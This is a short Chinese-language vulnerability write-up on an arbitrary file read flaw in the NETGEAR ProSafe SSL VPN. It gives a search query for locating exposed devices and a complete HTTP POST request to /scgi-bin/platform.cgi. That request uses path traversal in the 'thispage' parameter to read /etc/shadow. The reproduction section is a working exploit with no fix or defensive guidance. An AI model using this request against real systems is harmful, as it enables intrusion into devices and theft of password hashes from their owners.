# NETGEAR ProSafe SSL VPN 任意文件读取漏洞

# 一、漏洞简介
NETGEAR FVS336G是美国网件（NETGEAR）公司的一款VPN（虚拟私人网络）防火墙路由器。NETGEAR ProSafe SSL VPN 存在任意文件读取漏洞。

# 二、影响版本
+ NETGEAR ProSafe SSL VPN 

# 三、资产测绘
+ hunter`app.name=="NETGEAR ProSAFE"`
+ 特征

![1694579919965-2ed9bd62-7659-4f42-b63c-fbce7679b1ce.png](./img/heHKcRsfQDm4_YgN/1694579919965-2ed9bd62-7659-4f42-b63c-fbce7679b1ce-161150.png)

# 四、漏洞复现
```plain
POST /scgi-bin/platform.cgi HTTP/1.1
Host: xx.xx.xx.xx
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/117.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Te: trailers
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 218

thispage=../../../../../../../../../../../../../../../../etc/shadow &USERDBUsers.UserName=CFTg&USERDBUsers.Password=&USERDBDomains.Domainname=geardomain&button.login.USERDBUsers.router_status=Login&Login.userAgent=xlLc
```

![1694585071322-448be7b9-7f15-4b1c-a74a-90fc6f33527e.png](./img/heHKcRsfQDm4_YgN/1694585071322-448be7b9-7f15-4b1c-a74a-90fc6f33527e-828437.png)



> 更新: 2024-02-29 23:57:14  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/bt9faqk44fugqlqs>